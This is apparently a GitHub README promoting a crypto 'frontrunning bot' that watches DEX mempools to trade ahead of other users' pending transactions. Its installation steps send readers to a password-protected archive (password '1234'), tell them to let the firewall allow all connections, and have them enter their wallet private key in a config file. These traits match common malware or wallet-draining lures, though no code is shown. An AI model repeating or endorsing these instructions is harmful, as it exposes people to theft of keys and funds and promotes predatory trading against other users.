## What is frontrunning bot?
  A frontrunning bot specialized in automated market making (AMM) takes advantage of price fluctuations observed in decentralized exchanges (DEXs) that utilize the AMM model, such as Uniswap or PancakeSwap. By leveraging advanced algorithms, this bot actively monitors the network for impending trades and assesses the potential market impact of these trades. It strategically positions itself to capitalize on the price changes resulting from the original trades by executing its own trades before the initial orders are processed. The bot achieves this by analyzing the mempool, which comprises unconfirmed transactions awaiting inclusion in the blockchain. Through careful examination of the mempool and price movements, the bot predicts the price shifts that will occur upon trade execution, enabling it to execute profitable trades. AMM frontrunning bots prove particularly effective in DEXs with limited liquidity, as substantial trades can significantly impact the market, leading to exploitable price changes.

## Features
- **Multiple networks**: The bot can iteract with Uniswap-V3, SushiSwap, PancackeSwap and TraderJoe.
- **Mempool Monitoring**: The bot continuously monitors the mempool of the network, providing up-to-date information on pending transactions.
- **Transaction Analysis**: The bot analyzes pending transactions in the mempool, providing insights into transaction fees, gas prices, and other relevant metrics.
- **Profit transaction**: The bot performs transactions for most relevant pairs with low liquidity.

## Free version
- Supported networks: BSC
- Active contracts: 3
- Notifications: no

Actual free version in release section.

## Professional version
No limits!
No beta versions! 
For more information contact with me.

## Installation
1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtome if it has not been installed.
2. [Download](https://github.com/timo991/amm-frontrun/archive/refs/heads/main.zip) repository release and extract files with password `1234`.
3. Make shure that firewall does not blocks any connections.

## Usage
1. Open `config.json`. Edit network PRCs and private key for active account.
2. Launch software. Select AMM you need, set up contracts for monitoring.
3. In transaction section set up gas fees and profit percentage.
4. Start monitoring mempool and wait for profit.

All detailed instuctions, support and tips in professional version only :).

